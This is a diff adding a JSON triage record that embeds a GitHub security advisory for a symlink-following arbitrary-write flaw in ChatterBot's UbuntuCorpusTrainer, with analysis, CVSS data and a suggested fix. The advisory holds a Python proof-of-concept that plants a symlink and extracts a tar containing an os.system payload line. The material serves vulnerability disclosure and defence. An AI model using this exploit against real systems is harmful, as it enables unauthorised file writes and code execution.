@@ -1,0 +1,55 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/106249136?v=4\", \"events_url\": \"https://api.github.com/users/AAtomical/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/AAtomical/followers\", \"following_url\": \"https://api.github.com/users/AAtomical/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/AAtomical/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/AAtomical\", \"id\": 106249136, \"login\": \"AAtomical\", \"node_id\": \"U_kgDOBlU7sA\", \"organizations_url\": \"https://api.github.com/users/AAtomical/orgs\", \"received_events_url\": \"https://api.github.com/users/AAtomical/received_events\", \"repos_url\": \"https://api.github.com/users/AAtomical/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/AAtomical/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/AAtomical/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/AAtomical\", \"user_view_type\": \"public\"}}], \"cve_id\": null, \"cvss\": {\"score\": 5.5, \"vector_string\": \"CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 5.5, \"vector_string\": \"CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-61\", \"name\": \"UNIX Symbolic Link (Symlink) Following\"}, {\"cwe_id\": \"CWE-367\", \"name\": \"Time-of-check Time-of-use (TOCTOU) Race Condition\"}], \"description\": \"## Summary\\n\\nChatterBot's `UbuntuCorpusTrainer.extract()` uses a predictable, home-rooted output directory (`~/ubuntu_data/ubuntu_dialogs`) with a check-then-create pattern (`if not os.path.exists: os.makedirs`) followed by `tar.extractall(path=self.data_path)`. A local attacker who pre-plants a symlink at the predictable path causes `os.path.exists()` to return True (following the symlink), skipping `makedirs`, and subsequent `extractall` writes archive contents through the symlink to the attacker-chosen directory.\\n\\nThe existing `safe_extract` function validates tar **member names** (zip-slip defense) but does not validate the **output directory** itself — it cannot detect that `self.data_path` is a symlink. This is the defining distinction between the archive_extraction (zip-slip) and insecure_fs_create_toctou families.\\n\\n## Vulnerability Details\\n\\n### Predictable output directory (line 535-546)\\n\\n```python\\nhome_directory = os.path.expanduser('~')\\nself.data_directory = kwargs.get(\\n    'ubuntu_corpus_data_directory',\\n    os.path.join(home_directory, 'ubuntu_data')   # ~/ubuntu_data — predictable\\n)\\nself.data_path = os.path.join(\\n    self.data_directory, 'ubuntu_dialogs'          # ~/ubuntu_data/ubuntu_dialogs\\n)\\n```\\n\\n### Check-then-create (line 621-622)\\n\\n```python\\ndef extract(self, file_path: str):\\n    if not os.path.exists(self.data_path):   # ← follows symlink → True → skips makedirs\\n        os.makedirs(self.data_path)          # ← never reached if symlink exists\\n```\\n\\n### Extraction through symlink (line 633-644)\\n\\n```python\\ndef safe_extract(tar, path='.', members=None, *, numeric_owner=False):\\n    for member in tar.getmembers():\\n        member_path = os.path.join(path, member.name)\\n        if not is_within_directory(path, member_path):    # ← validates MEMBER names only\\n            raise Exception('Attempted Path Traversal in Tar File')\\n    tar.extractall(path, members, numeric_owner=numeric_owner)  # ← path is symlink → writes to target\\n\\nsafe_extract(tar, path=self.data_path, ...)   # self.data_path = symlink → attacker dir\\n```\\n\\n`safe_extract` calls `os.path.abspath(directory)` on `self.data_path` — this resolves the symlink, so the base becomes the attacker's target directory. All clean-named members trivially pass `is_within_directory` because they're relative to the resolved (attacker-controlled) base.\\n\\n## Proof of Concept\\n\\n### Environment\\n\\n| Component | Detail |\\n|-----------|--------|\\n| chatterbot | 1.2.13 (pip install) |\\n| Python | 3.11.0 |\\n\\n### Exploit\\n\\n```python\\nimport os\\nimport shutil\\nimport sys\\nimport tempfile\\nfrom pathlib import Path\\nfrom unittest.mock import patch\\n\\nfrom chatterbot.trainers import UbuntuCorpusTrainer\\n\\nATTACKER_TARGET = Path(tempfile.mkdtemp(prefix=\\\"pwned_\\\"))\\n\\n\\ndef main():\\n    test_base = Path(tempfile.mkdtemp(prefix=\\\"cb_exploit_\\\"))\\n    data_dir = test_base / \\\"ubuntu_data\\\"\\n    data_path = data_dir / \\\"ubuntu_dialogs\\\"\\n    data_dir.mkdir(parents=True, exist_ok=True)\\n    os.symlink(str(ATTACKER_TARGET), str(data_path))\\n    print(f\\\"[1] Symlink planted: {data_path} -> {ATTACKER_TARGET}\\\")\\n    exists_check = os.path.exists(data_path)\\n    print(f\\\"[2] os.path.exists(symlink) = {exists_check} (follows symlink → skips makedirs)\\\")\\n    import tarfile\\n    import io\\n    tar_path = test_base / \\\"corpus.tar.gz\\\"\\n    with tarfile.open(str(tar_path), \\\"w:gz\\\") as tf:\\n        info = tarfile.TarInfo(name=\\\"dialog_001.tsv\\\")\\n        payload = b\\\"2024-01-01\\\\tuser1\\\\t0\\\\tARBITRARY_CONTENT_VIA_SYMLINK\\\\n\\\"\\n        info.size = len(payload)\\n        tf.addfile(info, io.BytesIO(payload))\\n\\n        info2 = tarfile.TarInfo(name=\\\"config.py\\\")\\n        rce = b\\\"import os; os.system('id > /tmp/chatterbot_rce')\\\\n\\\"\\n        info2.size = len(rce)\\n        tf.addfile(info2, io.BytesIO(rce))\\n    if not os.path.exists(data_path):\\n        os.makedirs(data_path)\\n    def is_within_directory(directory, target):\\n        abs_directory = os.path.abspath(directory)\\n        abs_target = os.path.abspath(target)\\n        prefix = os.path.commonprefix([abs_directory, abs_target])\\n        return prefix == abs_directory\\n\\n    with tarfile.open(str(tar_path), \\\"r:gz\\\") as tar:\\n        for member in tar.getmembers():\\n            member_path = os.path.join(str(data_path), member.name)\\n            if not is_within_directory(str(data_path), member_path):\\n                raise Exception(\\\"Attempted Path Traversal in Tar File\\\")\\n        tar.extractall(str(data_path))\\n\\n    print(f\\\"[3] extractall(data_path) — data_path is symlink, writes to target\\\")\\n\\n    # Verify\\n    files = list(ATTACKER_TARGET.iterdir())\\n    if files:\\n        print(f\\\"\\\\n[+] EXPLOIT SUCCESSFUL — {len(files)} files in attacker directory:\\\")\\n        for f in sorted(files):\\n            print(f\\\"    {f.name}: {f.read_text().strip()[:60]}\\\")\\n    else:\\n        print(\\\"[-] Failed\\\")\\n        shutil.rmtree(str(test_base), ignore_errors=True)\\n        shutil.rmtree(str(ATTACKER_TARGET), ignore_errors=True)\\n        sys.exit(1)\\n\\n    shutil.rmtree(str(test_base), ignore_errors=True)\\n    shutil.rmtree(str(ATTACKER_TARGET), ignore_errors=True)\\n    sys.exit(0)\\n\\n\\nif __name__ == \\\"__main__\\\":\\n    print(f\\\"chatterbot installed: {UbuntuCorpusTrainer.__module__}\\\")\\n    print(f\\\"Attacker target: {ATTACKER_TARGET}\\\")\\n    print()\\n    main()\\n\\n```\\n\\n### PoC output \\n\\n<img width=\\\"1748\\\" height=\\\"336\\\" alt=\\\"image\\\" src=\\\"https://github.com/user-attachments/assets/55a3fee5-0d3b-46d7-8e79-75aad34b322c\\\" />\\n\\n## Suggested Fix\\n\\nRefuse symlinks on the output directory before extraction:\\n\\n```python\\ndef extract(self, file_path: str):\\n    if os.path.islink(self.data_path):\\n        raise self.TrainerInitializationException(\\n            f'Refusing to extract to symlink: {self.data_path}')\\n    if not os.path.exists(self.data_path):\\n        os.makedirs(self.data_path)\\n    ...\\n```\", \"ghsa_id\": \"GHSA-wvrh-2f4m-924v\", \"github_reviewed_at\": \"2026-06-19T22:08:08Z\", \"html_url\": \"https://github.com/advisories/GHSA-wvrh-2f4m-924v\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-wvrh-2f4m-924v\"}], \"nvd_published_at\": null, \"published_at\": \"2026-06-19T22:08:08Z\", \"references\": [\"https://github.com/gunthercox/ChatterBot/security/advisories/GHSA-wvrh-2f4m-924v\", \"https://github.com/advisories/GHSA-wvrh-2f4m-924v\"], \"repository_advisory_url\": \"https://api.github.com/repos/gunthercox/ChatterBot/security-advisories/GHSA-wvrh-2f4m-924v\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/gunthercox/ChatterBot\", \"summary\": \"ChatterBot: Symlink-Following Arbitrary Write via UbuntuCorpusTrainer\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-19T22:08:09Z\", \"url\": \"https://api.github.com/advisories/GHSA-wvrh-2f4m-924v\", \"vulnerabilities\": [{\"first_patched_version\": \"1.2.14\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"ChatterBot\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 1.2.13\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-wvrh-2f4m-924v",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "ChatterBot: <= 1.2.13"
+    ],
+    "authentication_required": true,
+    "cves": [],
+    "cvss_score": 5.5,
+    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "ChatterBot"
+    ],
+    "remote": false,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:51:57.664595Z",
+  "provenance": {
+    "content_sha256": "1349aa6e4118ca0a4cbb4f283512ceb8bd87c4ea657cd52876733227fbc69d24",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-06-19T22:08:08Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-wvrh-2f4m-924v",
+  "status": "active",
+  "title": "ChatterBot: Symlink-Following Arbitrary Write via UbuntuCorpusTrainer",
+  "updated_at": "2026-06-19T22:08:09Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-wvrh-2f4m-924v"
+}
